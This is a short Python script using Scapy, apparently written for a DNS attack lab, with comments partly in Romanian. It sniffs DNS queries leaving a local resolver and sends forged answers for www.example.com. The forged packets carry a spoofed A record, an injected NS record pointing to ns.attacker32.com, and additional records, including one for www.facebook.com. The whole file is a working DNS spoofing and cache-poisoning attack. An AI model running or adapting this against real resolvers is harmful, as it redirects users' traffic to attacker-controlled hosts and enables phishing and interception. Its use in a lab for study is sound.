#!/usr/bin/env python3
from scapy.all import *

def spoof_dns(pkt):
  #verificăm dacă un pachet de rețea (pkt) utilizează protocolul DNS și
  #dacă numele de domeniu interogat (QNAME) în cadrul pachetului este "www.example.com".
  if (DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode('utf-8')):
    pkt.show()
    # Swap the source and destination IP address
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    # Swap the source and destination port number
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
    # The Answer Section
    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='10.0.2.5')
    # Adaugarea campului de authority pentru example.com 
    NS_example_1 = DNSRR(rrname='example.com.', type='NS',
                   ttl=259200, rdata='ns.attacker32.com')
    NS_example_2 = DNSRR(rrname='example.com.', type='NS',
                   ttl=259200, rdata='ns.example.com')

  
    # Falsificarea inregistrarilor din sectiunea Additional
    Addsec1 = DNSRR(rrname='ns.attacker32.com.', type='A',
                    ttl=259200, rdata='1.2.3.4')
    Addsec2 = DNSRR(rrname='ns.example.net.', type='A',
                    ttl=259200, rdata='5.6.7.8')
    Addsec3 = DNSRR(rrname='www.facebook.com.', type='A',
                    ttl=259200, rdata='3.4.5.6')

     # Construct the DNS packet
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=2, arcount=3,
                 an=Anssec, ns=NS_example_1/NS_example_2, ar=Addsec1/Addsec2/Addsec3)
    # Construct the entire IP packet and send it out
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    spoofpkt.show()
    send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns() - atacam serverul local de dns
f = 'udp and src host 10.9.0.53  and dst port 53'
pkt = sniff(iface='br-8eb738e511da', filter=f, prn=spoof_dns)      
